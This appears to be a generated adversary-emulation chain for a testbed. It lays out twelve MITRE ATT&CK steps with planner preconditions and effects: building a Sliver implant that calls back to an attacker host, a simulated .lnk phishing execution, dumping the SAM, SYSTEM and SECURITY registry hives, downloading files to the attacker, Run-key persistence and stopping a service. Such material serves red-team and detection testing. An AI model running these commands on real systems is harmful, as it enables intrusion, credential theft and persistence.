# Chain 093

**Testbed**: `env0` · **Steps**: 12 · **Tactics touched**: Command and Control, Initial Access, Execution, Discovery, Credential Access, Collection, Persistence, Impact

## MITRE ATT&CK Coverage

| Tactic | Technique IDs |
|---|---|
| Command and Control | T1071.001 |
| Initial Access | T1566.002 |
| Execution | T1204.002, T1059.003 |
| Discovery | T1082 |
| Credential Access | T1003.002 |
| Collection | T1020 |
| Persistence | T1547.001 |
| Impact | T1489 |

## Attack Steps (Overview)

| # | Tactic | Technique | Action | Executor |
|---|---|---|---|---|
| 1 | Command and Control | T1071.001 | Build the executable file of a Sliver implant (for Windows) | Sliver Console |
| 2 | Initial Access | T1566.002 | Simulate the victim download a file on its machine | Human |
| 3 | Execution | T1204.002 | Simulate the victim double-click a shortcut (.lnk) that runs a pre-staged executable | Human |
| 4 | Command and Control | T1071.001 | Execute a Sliver Implant Payload | Sliver Session Establish |
| 5 | Discovery | T1082 | Environment Variable Retrieval | Sliver Executor |
| 6 | Execution | T1204.002 | Simulate the victim double-click a shortcut (.lnk) that runs a pre-staged executable as Admin | Human |
| 7 | Command and Control | T1071.001 | Execute a Sliver Implant Payload | Sliver Session Establish |
| 8 | Execution | T1059.003 | Execute Command (cmd.exe) | Sliver Session Derive |
| 9 | Credential Access | T1003.002 | Registry dump of SAM, creds, and secrets | Command Prompt Executor |
| 10 | Collection | T1020 | File Download Operation | Sliver Executor |
| 11 | Persistence | T1547.001 | Reg Key Run | Command Prompt Executor |
| 12 | Impact | T1489 | Windows - Stop service using net.exe | Command Prompt Executor |

## Attack Steps (Detail)

### Step 1 — Build the executable file of a Sliver implant (for Windows)

- **UUID**: `sliver-payload-windows-exe`
- **Source**: Manual
- **Supported platforms**: windows
- **Tactics**: Command and Control
- **MITRE ID(s)**: T1071.001
- **Technique(s)**: Application Layer Protocol - Web Protocols

**Description**

The command is used in the Sliver C2 (Command and Control) framework to generate a payload designed for remote access to a target machine.

**Execution** (Sliver Console)

```
sliver > generate --mtls #{LHOST}:#{LPORT} --os windows --arch 64bit --format exe --save #{SAVE_PATH}
sliver > mtls --lport #{LPORT}
```

**Arguments**

| Name | Description | Default | Required |
|---|---|---|---|
| `LHOST` | IP address of the attacker machine | — | yes |
| `LPORT` | listening port of the attacter machine | — | yes |
| `SAVE_PATH` | Saved path of the generated payload | — | yes |

**Preconditions**

- `(os-windows ?target - host)`

**Effects**

- `(sliver-implant-payload ?p - payload ?target - host)`
- `(file-payload ?p - payload ?file - file)`
- `(file-on-attacker ?path - string ?file - file)`
- `(standalone-exe-file ?file - file)`
- `(payload-handler-set ?p - payload)`
- `(callback-covered ?file - file)`

---

### Step 2 — Simulate the victim download a file on its machine

- **UUID**: `simulate-download-file`
- **Source**: Manual
- **Supported platforms**: windows
- **Tactics**: Initial Access
- **MITRE ID(s)**: T1566.002
- **Technique(s)**: Phishing: Spearphishing Link

**Description**

This step simulates the victim accidentally downloads a malicious file by clicking a link.

**Execution** (Human)

```
(This step needs human interaction and (temporarily) cannot be executed automatically)
(On attacker's machine)
python -m http.server #{LPORT}

(On victim's machine)
1. Open #{LHOST}:#{LPORT} in the browser
2. Navigate to the path of the file on the attacker's machine
3. Download the file to #{SAVE_PATH}
```

**Arguments**

| Name | Description | Default | Required |
|---|---|---|---|
| `LHOST` | IP address of the http file server (typically the attacker machine) | — | yes |
| `LPORT` | port of the http file server | 8000 | yes |
| `SAVE_PATH` | Saved path of the downloaded payload | — | yes |

**Preconditions**

- `(allow-simulate-user-action ?target - host)`
- **or**(`(os-linux ?target - host)`, `(os-windows ?target - host)`, `(os-macos ?target - host)`)
- `(file-on-attacker ?localpath - string ?file - file)`

**Effects**

- `(file-exists ?path - string ?file - file ?target - host)`

---

### Step 3 — Simulate the victim double-click a shortcut (.lnk) that runs a pre-staged executable

- **UUID**: `simulate-execute-lnk-windows`
- **Source**: Manual
- **Supported platforms**: windows
- **Tactics**: Execution
- **MITRE ID(s)**: T1204.002
- **Technique(s)**: User Execution: Malicious File

**Description**

This step simulates the victim opening a `.lnk` shortcut file whose target is a pre-staged executable on the victim host. LNKs are a very common phishing vehicle — often delivered inside an archive with a misleading double-extension name (e.g. `invoice.pdf.lnk`). Double-clicking the shortcut runs the pointed-to executable via `explorer.exe`.

**Execution** (Human)

```
(This step needs human interaction and (temporarily) cannot be executed automatically)
(On victim's machine, on the desktop or a folder)
Double-click a shortcut (.lnk) file whose target is:
#{EXE_PATH}
```

**Arguments**

| Name | Description | Default | Required |
|---|---|---|---|
| `EXE_PATH` | Path of the executable the shortcut points at | — | yes |

**Preconditions**

- `(allow-simulate-user-action ?target - host)`
- `(os-windows ?target - host)`
- `(file-exists ?path - string ?file - file ?target - host)`
- `(standalone-exe-file ?file - file)`
- `(callback-covered ?file - file)`

**Effects**

- `(file-executed ?file - file ?target - host)`

---

### Step 4 — Execute a Sliver Implant Payload

- **UUID**: `execute-sliver-payload-file`
- **Source**: Sliver
- **Supported platforms**: windows
- **Tactics**: Command and Control
- **MITRE ID(s)**: T1071.001
- **Technique(s)**: Application Layer Protocol - Web Protocols

**Description**

Executing a Sliver implant payload will establish a Sliver session.

**Execution** (Sliver Session Establish)

```
None
```

**Preconditions**

- `(sliver-implant-payload ?p - payload ?target - host)`
- `(file-payload ?p - payload ?f - file)`
- `(file-executed ?f - file ?target - host)`
- `(payload-handler-set ?p - payload)`

**Effects**

- `(sliver-session ?s - executor ?target - host)`
- **when** `(file-executed-elevated ?f - file ?target - host)` → `(elevated-executor ?s - executor)`

---

### Step 5 — Environment Variable Retrieval

- **UUID**: `sliver-get_env`
- **Source**: Sliver
- **Supported platforms**: windows, linux
- **Tactics**: Discovery
- **MITRE ID(s)**: T1082
- **Technique(s)**: System Information Discovery

**Description**

The `get_env` command retrieves environment variable values.

**Execution** (Sliver Executor)

```
get_env(name=#{name}, session_id=#{executor})
```

**Arguments**

| Name | Description | Default | Required |
|---|---|---|---|
| `executor` | The session ID of the active Sliver connection. | — | yes |
| `name` | Environment variable name to query | — | yes |

**Preconditions**

- **or**(`(os-windows ?target - host)`, `(os-linux ?target - host)`)
- `(sliver-session ?executorID - executor ?target - host)`

**Effects**

- `(system-information-info-known ?target - host)`

---

### Step 6 — Simulate the victim double-click a shortcut (.lnk) that runs a pre-staged executable as Admin

- **UUID**: `simulate-execute-lnk-windows-root`
- **Source**: Manual
- **Supported platforms**: windows
- **Tactics**: Execution
- **MITRE ID(s)**: T1204.002
- **Technique(s)**: User Execution: Malicious File

**Description**

This step simulates the victim opening a `.lnk` shortcut whose target is a pre-staged executable **and the shortcut is configured / launched such that the target runs as Administrator** — either the shortcut's Properties → Advanced → "Run as administrator" flag is set, or the victim right-clicks the shortcut and selects "Run as administrator".

**Execution** (Human)

```
(This step needs human interaction and (temporarily) cannot be executed automatically)
(On victim's machine, on the desktop or a folder)
Right-click a shortcut (.lnk) whose target is:
#{EXE_PATH}
then select "Run as administrator" (or open its Properties → Advanced → tick "Run as administrator", then double-click).
```

**Arguments**

| Name | Description | Default | Required |
|---|---|---|---|
| `EXE_PATH` | Path of the executable the shortcut points at | — | yes |

**Preconditions**

- `(allow-simulate-user-action ?target - host)`
- `(os-windows ?target - host)`
- `(file-exists ?path - string ?file - file ?target - host)`
- `(standalone-exe-file ?file - file)`
- `(callback-covered ?file - file)`

**Effects**

- `(file-executed-elevated ?file - file ?target - host)`

---

### Step 7 — Execute a Sliver Implant Payload

- **UUID**: `execute-sliver-payload-file`
- **Source**: Sliver
- **Supported platforms**: windows
- **Tactics**: Command and Control
- **MITRE ID(s)**: T1071.001
- **Technique(s)**: Application Layer Protocol - Web Protocols

**Description**

Executing a Sliver implant payload will establish a Sliver session.

**Execution** (Sliver Session Establish)

```
None
```

**Preconditions**

- `(sliver-implant-payload ?p - payload ?target - host)`
- `(file-payload ?p - payload ?f - file)`
- `(file-executed ?f - file ?target - host)`
- `(payload-handler-set ?p - payload)`

**Effects**

- `(sliver-session ?s - executor ?target - host)`
- **when** `(file-executed-elevated ?f - file ?target - host)` → `(elevated-executor ?s - executor)`

---

### Step 8 — Execute Command (cmd.exe)

- **UUID**: `sliver-cmd`
- **Source**: Sliver
- **Supported platforms**: windows
- **Tactics**: Execution
- **MITRE ID(s)**: T1059.003
- **Technique(s)**: Command and Scripting Interpreter: Windows Command Shell


**Description**

The `cmd.exe` command executes a Windows command. It runs the specified command on the remote host and returns the result. This command is useful for performing various system tasks.

**Execution** (Sliver Session Derive)

```
# no-op — derivation only
```

**Arguments**

| Name | Description | Default | Required |
|---|---|---|---|
| `executor_parent` | The session ID of the active Sliver connection. | — | yes |
| `executor_derived` | The derived Windows CMD executor. | — | yes |

**Preconditions**

- `(os-windows ?target - host)`
- `(sliver-session ?executorID - executor ?target - host)`

**Effects**

- `(command-prompt ?s2 - executor ?target - host)`
- **when** `(elevated-executor ?executorID - executor)` → `(elevated-executor ?s2 - executor)`

---

### Step 9 — Registry dump of SAM, creds, and secrets

- **UUID**: `art-t1003_002-reg-save-sam`
- **Source**: Atomic Red Team
- **Supported platforms**: windows
- **Tactics**: Credential Access
- **MITRE ID(s)**: T1003.002
- **Technique(s)**: OS Credential Dumping: Security Account Manager

**Description**

`reg save` writes the SAM, SYSTEM and SECURITY registry hives to a
target-side directory (default `%TEMP%`). The hives hold encrypted /
structured credential material — offline processing (impacket-
secretsdump, creddump7, PowerDump, …) is a separate step and is NOT
modelled by this action. A chain that wants to close the credential-
access stage via this path must include downstream file exfil +
offline-parse actions. ART auto_generated_guid
5c2571d0-1572-416d-9676-812e64ca9f44.

**Execution** (Command Prompt Executor)

```
reg save HKLM\sam #{save_dir}\sam
reg save HKLM\system #{save_dir}\system
reg save HKLM\security #{save_dir}\security
```

**Arguments**

| Name | Description | Default | Required |
|---|---|---|---|
| `executor` | The Command Prompt session ID used to invoke reg save. | — | yes |
| `save_dir` | Directory on the target where the SAM / SYSTEM / SECURITY hives are written. | %TEMP% | yes |

**Preconditions**

- `(os-windows ?target - host)`
- `(command-prompt ?executorID - executor ?target - host)`
- `(elevated-executor ?executorID - executor)`

**Effects**

- `(credential-data ?d - data ?target - host)`
- `(data-stored-in-file ?d - data ?f - file)`
- `(file-exists ?path - string ?f - file ?target - host)`
- `(callback-covered ?f - file)`

---

### Step 10 — File Download Operation

- **UUID**: `sliver-download`
- **Source**: Sliver
- **Supported platforms**: windows, linux
- **Tactics**: Collection
- **MITRE ID(s)**: T1020
- **Technique(s)**: Data from Local System

**Description**

The `download` command transfers files from target system to local machine.

**Execution** (Sliver Executor)

```
download(session_id=#{executor}, remote_path=#{remote_path}, recurse=#{recurse}, output_dir=#{output_dir})
```

**Arguments**

| Name | Description | Default | Required |
|---|---|---|---|
| `executor` | The session ID of the active Sliver connection. | — | yes |
| `remote_path` | Full path to remote file/directory | — | yes |
| `recurse` | Recursive download (true/false) | False | yes |
| `output_dir` | Local directory to save files | /tmp | yes |

**Preconditions**

- **or**(`(os-windows ?target - host)`, `(os-linux ?target - host)`)
- `(sliver-session ?executorID - executor ?target - host)`
- `(file-exists ?remote_path - string ?file - file ?target - host)`

**Effects**

- `(file-on-attacker ?localpath - string ?file - file)`

---

### Step 11 — Reg Key Run

- **UUID**: `art-t1547_001-reg-key-run`
- **Source**: Atomic Red Team
- **Supported platforms**: windows
- **Tactics**: Persistence
- **MITRE ID(s)**: T1547.001
- **Technique(s)**: Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder

**Description**

Adds a value to the `HKCU\...\CurrentVersion\Run` registry key so a
chosen command runs whenever the current user logs in. Classic user-
scope autorun; unelevated, survives reboot. ART auto_generated_guid
e55be3fd-3521-4610-9d1a-e210e42dcf05.

**Execution** (Command Prompt Executor)

```
REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "#{value_name}" /t REG_SZ /F /D "#{command_to_execute}"
```

**Arguments**

| Name | Description | Default | Required |
|---|---|---|---|
| `executor` | The Command Prompt session ID used to invoke reg add. | — | yes |
| `value_name` | Registry value name under Run key. | Atomic Red Team | yes |
| `command_to_execute` | Command / path to execute at next user logon. | C:\\Users\\Public\\payload.exe | yes |

**Preconditions**

- `(os-windows ?target - host)`
- `(command-prompt ?executorID - executor ?target - host)`

**Effects**

- `(command-execution-at-startup ?c - string ?target - host)`

---

### Step 12 — Windows - Stop service using net.exe

- **UUID**: `art-t1489-net-stop-service`
- **Source**: Atomic Red Team
- **Supported platforms**: windows
- **Tactics**: Impact
- **MITRE ID(s)**: T1489
- **Technique(s)**: Service Stop

**Description**

Stops a Windows service via `net stop`. Functionally identical to
sc.exe stop; different binary/command surface for detection variety.
ART auto_generated_guid 41274289-ec9c-4213-bea4-e43c4aa57954.

**Execution** (Command Prompt Executor)

```
net.exe stop #{service_name}
```

**Arguments**

| Name | Description | Default | Required |
|---|---|---|---|
| `executor` | The Command Prompt session ID used to invoke net. | — | yes |
| `service_name` | Name of the Windows service to stop. | spooler | yes |

**Preconditions**

- `(os-windows ?target - host)`
- `(command-prompt ?executorID - executor ?target - host)`
- `(elevated-executor ?executorID - executor)`

**Effects**

- `(process-terminated ?p - process ?target - host)`

---
